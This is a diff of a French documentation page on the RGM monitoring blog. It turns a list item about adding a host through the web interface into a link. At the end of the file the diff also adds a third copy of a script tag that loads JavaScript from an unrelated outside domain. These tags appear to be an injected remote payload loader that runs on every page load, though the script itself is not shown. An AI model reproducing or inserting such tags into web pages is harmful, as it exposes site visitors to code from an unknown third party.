@@ -19,7 +19,7 @@ post_date: 2019-12-14 21:51:27
       <li>
         <a href="https://blog.rgm-cloud.io/guide-utilisation/creation-dun-host-dans-rgm/">Ajout d'un "Host" dans RGM</a> <ol style="list-style-type: lower-alpha;">
           <li>
-            Déclaration et configuration dans l'interface Web
+            <a href="https://blog.rgm-cloud.io/guide-utilisation/creation-dun-host-dans-rgm/declaration-dun-host-et-configuration-dans-linterface-web/">Ajout et configuration depuis l'interface Web</a>
           </li>
           <li>
             Inscription automatisée avec agent
@@ -33,4 +33,4 @@ post_date: 2019-12-14 21:51:27
   </li>
 </ol>
 
-<script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
+<script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
